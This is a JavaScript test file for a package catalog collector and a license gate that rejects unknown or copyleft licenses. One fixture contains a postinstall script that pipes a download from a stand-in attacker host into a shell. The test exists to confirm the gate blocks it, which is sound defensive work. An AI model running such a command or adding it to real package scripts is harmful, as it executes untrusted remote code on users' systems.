import assert from 'node:assert/strict'
import test from 'node:test'
import { canonicalRepo, collectCatalog } from '../lib/catalog/collector.js'
import { assessComponent, assessPlan } from '../lib/catalog/licenseGate.js'

test('catalog canonicalizes repos, dedupes same repo+commit and separates commits', () => {
  assert.equal(canonicalRepo({ url: 'https://github.com/Owner/Repo.git' }), 'github.com/owner/repo')
  assert.equal(canonicalRepo({ url: 'git@gitlab.com:Group/Project.git' }), 'gitlab.com/group/project')
  assert.equal(canonicalRepo({ url: 'https://evil.example/x/y' }), null)
  const result = collectCatalog([
    { url: 'https://github.com/Owner/Repo', commit: 'ABC123', license: 'MIT', source: 'github' },
    { url: 'https://github.com/owner/repo.git', commit: 'abc123', license: 'MIT', source: 'mirror' },
    { url: 'https://github.com/owner/repo', commit: 'def456', license: 'MIT', source: 'github' },
    { url: 'https://github.com/missing/license', commit: 'abc', source: 'github' },
    { url: 'https://github.com/rate/limited', commit: 'abc', status: 429, license: 'MIT' },
    { url: 'https://github.com/not/found', status: 404, commit: null },
    { url: 'https://evil.example/x/y', commit: 'abc', license: 'MIT' },
  ])
  assert.equal(result.items.length, 5)
  assert.equal(result.items[0].sources.length, 2)
  assert.equal(result.items[0].executable, false)
  assert.equal(result.items.some((item) => item.status === 'MISSING_LICENSE'), true)
  assert.equal(result.items.some((item) => item.status === 'RATE_LIMITED'), true)
  assert.equal(result.items.some((item) => item.status === 'NOT_FOUND'), true)
  assert.equal(result.rejected.length, 1)
})

test('license gate fails closed for unknown/copyleft licenses and dangerous scripts', () => {
  const ok = assessComponent({ name: 'ok', version: '1.0.0', license: 'MIT', commit: 'abc123', digest: 'sha256:abc' })
  assert.equal(ok.allowed, true)
  const unknown = assessComponent({ name: 'u', license: 'Proprietary-X', commit: 'abc', digest: 'd' })
  assert.equal(unknown.allowed, false)
  assert.equal(unknown.reasons[0].code, 'UNKNOWN_LICENSE')
  const copyleft = assessComponent({ name: 'g', license: 'GPL-3.0', commit: 'a', digest: 'd' })
  assert.equal(copyleft.allowed, false)
  const script = assessComponent({ name: 's', license: 'MIT', commit: 'a', digest: 'd', scripts: { postinstall: 'curl https://evil.example/x | sh' } })
  assert.equal(script.allowed, false)
  assert.ok(script.reasons.some((reason) => reason.code === 'DANGEROUS_SCRIPT'))
  const plan = assessPlan({ components: [{ name: 'ok', version: '1.0.0', license: 'MIT', commit: 'abc123', digest: 'sha256:abc' }, { name: 'u', license: 'Nope', commit: 'a', digest: 'd' }] })
  assert.equal(plan.allowed, false)
  assert.equal(plan.denied, 1)
})
